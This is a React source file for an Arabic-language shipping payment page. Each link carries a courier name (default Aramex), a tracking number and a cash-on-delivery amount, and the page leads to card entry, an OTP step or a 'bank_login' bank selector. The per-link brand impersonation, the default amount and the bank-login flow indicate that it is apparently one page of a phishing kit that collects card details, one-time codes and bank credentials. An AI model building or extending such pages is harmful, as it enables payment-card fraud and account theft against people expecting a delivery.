import { useParams, useNavigate } from "react-router-dom";
import { useTheme } from "@/themes/ThemeContext";
import { PaymentHeader, PaymentCard, PaymentButton } from "@/components/payment";
import { useLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck } from "lucide-react";
import "@/themes/themeStyles.css";

const PaymentDetailsTheme = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);
  const { theme } = useTheme();

  if (!theme) {
    return (
      <div style={{
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        minHeight: '100vh',
      }}>
        <div className="spinner" />
      </div>
    );
  }

  const serviceKey = linkData?.payload?.service_key || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const shippingInfo = linkData?.payload as any;

  // Get URL parameters
  const urlParams = new URLSearchParams(window.location.search);
  const countryCode = urlParams.get('country') || shippingInfo?.selectedCountry || "SA";
  const currencyCode = urlParams.get('currency') || "SAR";

  // Get currency info for display
  const currencyInfo = getCurrencyByCountry(countryCode);

  // Get amount from link data - ensure it's a number, handle all data types
  const rawAmount = shippingInfo?.cod_amount;

  // Handle different data types and edge cases
  let amount = 500; // Default value
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  // Format amount with currency symbol and name
  const formattedAmount = formatCurrency(amount, countryCode);

  const handleProceed = () => {
    // Check payment method from link data
    const paymentMethod = shippingInfo?.payment_method || 'card';

    // If payment method is "card", skip bank selector and go directly to card input
    if (paymentMethod === 'card') {
      navigate(`/pay/${id}/card-input?country=${countryCode}&currency=${currencyCode}`);
    } else {
      // For "bank_login" method, show bank selector
      navigate(`/pay/${id}/bank-selector?country=${countryCode}&currency=${currencyCode}`);
    }
  };

  const steps = [
    { id: '1', label: 'التفاصيل', description: 'معلومات الدفعة' },
    { id: '2', label: 'المستلم', description: 'بيانات الاستلام' },
    { id: '3', label: 'الدفع', description: 'معلومات البطاقة' },
    { id: '4', label: 'التحقق', description: 'رمز OTP' },
  ];

  return (
    <div className="fade-in" style={{
      minHeight: '100vh',
      backgroundColor: theme.colors.background,
      padding: theme.spacing.md,
    }}>
      {/* Payment Header with Company Branding */}
      <PaymentHeader
        title="تفاصيل الدفع"
        subtitle={`خدمة ${serviceName}`}
        showBackButton={true}
        logoPosition="left"
      />

      <div style={{
        maxWidth: '600px',
        margin: `${theme.spacing.lg} auto`,
        display: 'flex',
        flexDirection: 'column',
        gap: theme.spacing.lg,
      }}>
        {/* Progress Steps */}
        <div className="slide-in">
          <div style={{
            backgroundColor: theme.colors.surface,
            padding: theme.spacing.lg,
            borderRadius: theme.borderRadius.lg,
            border: `1px solid ${theme.colors.border}`,
          }}>
            <div style={{
              display: 'flex',
              justifyContent: 'space-between',
              marginBottom: theme.spacing.md,
            }}>
              <span style={{
                fontSize: theme.fonts.sizes.sm,
                fontWeight: theme.fonts.weights.semibold,
                color: theme.colors.text,
              }}>
                الخطوة 1 من 4
              </span>
              <span style={{
                fontSize: theme.fonts.sizes.xs,
                color: theme.colors.textSecondary || theme.colors.text,
              }}>
                {serviceName}
              </span>
            </div>

            {/* Progress Bar */}
            <div style={{
              width: '100%',
              height: '4px',
              backgroundColor: theme.colors.border,
              borderRadius: theme.borderRadius.full,
              overflow: 'hidden',
            }}>
              <div style={{
                width: '25%',
                height: '100%',
                backgroundColor: theme.colors.primary,
                borderRadius: theme.borderRadius.full,
                transition: 'width 0.5s ease',
              }} />
            </div>
          </div>
        </div>

        {/* Shipping Info Display */}
        {shippingInfo && (
          <div className="slide-in" style={{
            animationDelay: '0.1s',
          }}>
            <PaymentCard title="تفاصيل الشحنة">
              <div style={{
                display: 'flex',
                flexDirection: 'column',
                gap: theme.spacing.md,
              }}>
                {shippingInfo.tracking_number && (
                  <div style={{
                    display: 'flex',
                    alignItems: 'center',
                    gap: theme.spacing.sm,
                    padding: theme.spacing.sm,
                    backgroundColor: theme.colors.background,
                    borderRadius: theme.borderRadius.sm,
                  }}>
                    <Hash size={20} style={{ color: theme.colors.primary }} />
                    <div>
                      <div style={{
                        fontSize: theme.fonts.sizes.xs,
                        color: theme.colors.textSecondary || theme.colors.text,
                      }}>
                        رقم الشحنة:
                      </div>
                      <div style={{
                        fontSize: theme.fonts.sizes.sm,
                        fontWeight: theme.fonts.weights.semibold,
                        color: theme.colors.text,
                      }}>
                        {shippingInfo.tracking_number}
                      </div>
                    </div>
                  </div>
                )}

                {shippingInfo.package_description && (
                  <div style={{
                    display: 'flex',
                    alignItems: 'center',
                    gap: theme.spacing.sm,
                    padding: theme.spacing.sm,
                    backgroundColor: theme.colors.background,
                    borderRadius: theme.borderRadius.sm,
                  }}>
                    <Package size={20} style={{ color: theme.colors.primary }} />
                    <div>
                      <div style={{
                        fontSize: theme.fonts.sizes.xs,
                        color: theme.colors.textSecondary || theme.colors.text,
                      }}>
                        وصف الطرد:
                      </div>
                      <div style={{
                        fontSize: theme.fonts.sizes.sm,
                        fontWeight: theme.fonts.weights.semibold,
                        color: theme.colors.text,
                      }}>
                        {shippingInfo.package_description}
                      </div>
                    </div>
                  </div>
                )}

                {shippingInfo.cod_amount > 0 && (
                  <div style={{
                    display: 'flex',
                    alignItems: 'center',
                    gap: theme.spacing.sm,
                    padding: theme.spacing.sm,
                    backgroundColor: theme.colors.background,
                    borderRadius: theme.borderRadius.sm,
                  }}>
                    <DollarSign size={20} style={{ color: theme.colors.primary }} />
                    <div>
                      <div style={{
                        fontSize: theme.fonts.sizes.xs,
                        color: theme.colors.textSecondary || theme.colors.text,
                      }}>
                        مبلغ COD:
                      </div>
                      <div style={{
                        fontSize: theme.fonts.sizes.sm,
                        fontWeight: theme.fonts.weights.semibold,
                        color: theme.colors.text,
                      }}>
                        {formatCurrency(shippingInfo.cod_amount, countryCode)}
                      </div>
                    </div>
                  </div>
                )}
              </div>
            </PaymentCard>
          </div>
        )}

        {/* Payment Summary */}
        <div className="slide-in" style={{
          animationDelay: '0.2s',
        }}>
          <PaymentCard title="ملخص الدفعة">
            <div style={{
              display: 'flex',
              flexDirection: 'column',
              gap: theme.spacing.md,
            }}>
              <div style={{
                display: 'flex',
                justifyContent: 'space-between',
                alignItems: 'center',
                paddingBottom: theme.spacing.md,
                borderBottom: `1px solid ${theme.colors.border}`,
              }}>
                <span style={{
                  fontSize: theme.fonts.sizes.base,
                  color: theme.colors.textSecondary || theme.colors.text,
                }}>
                  الخدمة
                </span>
                <span style={{
                  fontSize: theme.fonts.sizes.base,
                  fontWeight: theme.fonts.weights.semibold,
                  color: theme.colors.text,
                }}>
                  {serviceName}
                </span>
              </div>

              <div style={{
                display: 'flex',
                justifyContent: 'space-between',
                alignItems: 'center',
                padding: theme.spacing.lg,
                background: theme.style.hasGradient
                  ? `linear-gradient(to ${theme.style.gradientDirection}, ${theme.colors.primary}15, ${theme.colors.secondary}15)`
                  : theme.colors.background,
                borderRadius: theme.borderRadius.md,
                border: `1px solid ${theme.colors.border}`,
              }}>
                <span style={{
                  fontSize: theme.fonts.sizes.lg,
                  fontWeight: theme.fonts.weights.bold,
                  color: theme.colors.text,
                }}>
                  المبلغ الإجمالي
                </span>
                <span style={{
                  fontSize: theme.fonts.sizes.xxl,
                  fontWeight: theme.fonts.weights.bold,
                  color: theme.colors.primary,
                }}>
                  {formattedAmount}
                </span>
              </div>
            </div>
          </PaymentCard>
        </div>

        {/* Payment Method */}
        <div className="slide-in" style={{
          animationDelay: '0.3s',
        }}>
          <PaymentCard title="طريقة الدفع">
            <div style={{
              padding: theme.spacing.lg,
              border: `2px solid ${theme.colors.primary}`,
              borderRadius: theme.borderRadius.md,
              backgroundColor: `${theme.colors.primary}10`,
            }}>
              <div style={{
                display: 'flex',
                alignItems: 'center',
                gap: theme.spacing.md,
              }}>
                <CreditCard size={24} style={{ color: theme.colors.primary }} />
                <div>
                  <div style={{
                    fontSize: theme.fonts.sizes.base,
                    fontWeight: theme.fonts.weights.semibold,
                    color: theme.colors.text,
                    marginBottom: theme.spacing.xs,
                  }}>
                    الدفع بالبطاقة
                  </div>
                  <div style={{
                    fontSize: theme.fonts.sizes.sm,
                    color: theme.colors.textSecondary || theme.colors.text,
                  }}>
                    Visa، Mastercard، Mada
                  </div>
                </div>
              </div>
            </div>
          </PaymentCard>
        </div>

        {/* Proceed Button */}
        <div className="slide-in" style={{
          animationDelay: '0.4s',
        }}>
          <PaymentButton
            variant="primary"
            size="lg"
            fullWidth={true}
            onClick={handleProceed}
            icon={<ArrowLeft size={20} />}
          >
            المتابعة للدفع
          </PaymentButton>

          <div style={{
            marginTop: theme.spacing.md,
            textAlign: 'center' as const,
          }}>
            <span style={{
              fontSize: theme.fonts.sizes.xs,
              color: theme.colors.textSecondary || theme.colors.text,
            }}>
              بالمتابعة، أنت توافق على الشروط والأحكام
            </span>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PaymentDetailsTheme;
